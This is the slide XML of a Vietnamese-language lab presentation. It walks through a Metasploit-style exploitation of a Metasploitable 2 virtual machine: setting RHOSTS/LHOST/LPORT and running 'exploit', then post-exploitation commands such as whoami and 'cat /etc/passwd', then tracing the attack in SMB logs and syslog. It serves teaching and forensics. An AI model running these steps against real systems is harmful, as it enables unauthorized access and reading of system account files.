                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{C17A628D-4C14-43B4-B2E9-C29496DDD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8672" y="2866947"/>
            <a:ext cx="6258798" cy="562053"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="9" name="Picture 8">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{7149C9DC-FE0D-44F5-B0F0-5C827E9E84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8757" y="4020208"/>
            <a:ext cx="5201376" cy="905001"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="61976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363536" y="237880"/>
            <a:ext cx="11465142" cy="340022"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="90000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" err="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Kiểm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lại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Cấu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hình</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800"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409866" y="706186"/>
            <a:ext cx="11535856" cy="5913934"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>	show options</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0"/>
              <a:t>Đảm bảo các giá trị </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0"/>
              <a:t>$RHOSTS$, $LHOST$ và </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0"/>
              <a:t>$LPORT$ đã được thiết </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0"/>
              <a:t>lập chính xác.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="5" name="Picture 4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{F231F7C2-8375-4915-AD3C-BF58B969EF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822" y="623496"/>
            <a:ext cx="7783011" cy="5611008"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="67908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260908" y="150097"/>
            <a:ext cx="11684814" cy="486325"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="fr-FR" sz="2800" dirty="0" err="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Thực</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thi</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Tấn</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công</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" sz="2800" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> (Exploitation)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US"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260907" y="823230"/>
            <a:ext cx="11684813" cy="5723874"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>	exploit</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>	</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>hoặc</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>	run</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>Xác</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>minh</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>Quyền</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>hạn</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>Bạn</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>có</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>thể</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>chạy</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>lệnh</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>để</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bạn</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>đang</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>có</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>quyền</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>gì</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>trên</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>hệ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>thống</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>	</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>whoami</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="5" name="Picture 4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{E0CC057A-658A-43C8-99CB-CECF9F5C1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2347" y="823230"/>
            <a:ext cx="7744906" cy="1143160"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="7" name="Picture 6">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{8743AAE8-B378-45A7-A0E4-5F582AA772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5119" y="2500173"/>
            <a:ext cx="7878274" cy="1448002"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3275264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260908" y="193988"/>
            <a:ext cx="11604346" cy="742357"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="90000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="vi-VN" sz="2400" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Thực hiện các lệnh Post-Exploitation: Bạn có thể chạy các lệnh cơ bản để thu thập thông tin và chứng minh việc chiếm quyền kiểm soát:</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363320" y="1145099"/>
            <a:ext cx="11501934" cy="5431266"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>	ls –la</a:t>
            </a:r>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dirty="0"/>
              <a:t>	ifconfig</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="5" name="Picture 4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{4F7DCE25-D3EF-4594-B17F-19B1EC18F6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653" y="981563"/>
            <a:ext cx="4637838" cy="2874553"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="7" name="Picture 6">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{D9C91E70-8F24-4E80-AD08-EA9590010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3428" y="3965845"/>
            <a:ext cx="4637838" cy="2610520"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3638821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202385" y="172043"/>
            <a:ext cx="11750651" cy="479010"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>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metasploiable</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exploit:</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202385" y="903697"/>
            <a:ext cx="11640924" cy="5584885"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>	C</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>at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/passwd</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="5" name="Picture 4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{8E492762-F611-4855-8665-A80199C02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311" y="755179"/>
            <a:ext cx="6430272" cy="6020640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3174369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312112" y="281904"/>
            <a:ext cx="11662869" cy="6155471"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>Xem</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>phiên</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>bản</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>hệ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>điều</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>hành</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>	cat /</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>etc</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>/issue</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0"/>
              <a:t>Xem các thư mục:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>	ls -la /root/</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Exit:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="5" name="Picture 4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{09C9D31B-18D1-484D-859B-8F23F499C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178" y="133993"/>
            <a:ext cx="6182588" cy="2221502"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="7" name="Picture 6">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{9B9EC6EF-8C16-4097-98A1-46B96E476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7239" y="2546179"/>
            <a:ext cx="5839640" cy="3715268"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="9" name="Picture 8">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{03C57ACD-9DBB-43C2-BB28-4345A74C2D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112" y="4587719"/>
            <a:ext cx="5048955" cy="1476581"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1935613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260907" y="135467"/>
            <a:ext cx="11450728" cy="376597"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" err="1"/>
              <a:t>Phân</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" err="1"/>
              <a:t>tích</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" err="1"/>
              <a:t>pháp</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t> y, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" err="1"/>
              <a:t>truy</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" err="1"/>
              <a:t>vết</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" err="1"/>
              <a:t>tấn</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" err="1"/>
              <a:t>công</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" err="1"/>
              <a:t>từ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" err="1"/>
              <a:t>máy</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t> victim (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" err="1"/>
              <a:t>metasploiable</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t> 2):</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>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356005" y="801284"/>
            <a:ext cx="11450727" cy="5723874"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>	cat </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>log.smbd</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>	</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>và</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>	cat /var/log/syslog</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="5" name="Picture 4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{3A1D5706-3504-420F-82A3-519B05DCE7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5827" y="720174"/>
            <a:ext cx="7020905" cy="428685"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="7" name="Picture 6">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{36E10640-473E-4560-880F-20E5A4E224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5827" y="1673867"/>
            <a:ext cx="6115904" cy="247685"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="4258304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299922" y="314554"/>
            <a:ext cx="11536071" cy="6291072"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>Kết</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>quả</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>của</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>truy</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>vết</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="5" name="Picture 4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{12A40A67-E0C8-4D9E-8E4E-040886500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095" y="733906"/>
            <a:ext cx="4910053" cy="2695094"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="7" name="Picture 6">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{CDA8684A-F13E-4ABB-A64F-0C091EDF6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7497" y="572972"/>
            <a:ext cx="4539041" cy="2533321"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="9" name="Picture 8">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{7E7A85C4-FFF6-41DC-930B-848300039B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007" y="3639284"/>
            <a:ext cx="4980163" cy="2756057"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="11" name="Picture 10">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{552D6AB4-ADAD-4942-844A-F3122FD806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4650" y="3544487"/>
            <a:ext cx="4696400" cy="2622944"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1599476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270662" y="336500"/>
            <a:ext cx="11528756" cy="6188658"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="5" name="Picture 4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{A58BBA06-E118-4A6A-A071-EA3CD09DE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554" y="643089"/>
            <a:ext cx="4969956" cy="2785911"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="7" name="Picture 6">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{74CF3B93-45CD-4B5D-B322-7BBE27220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5100" y="3519127"/>
            <a:ext cx="5005353" cy="2785911"/>
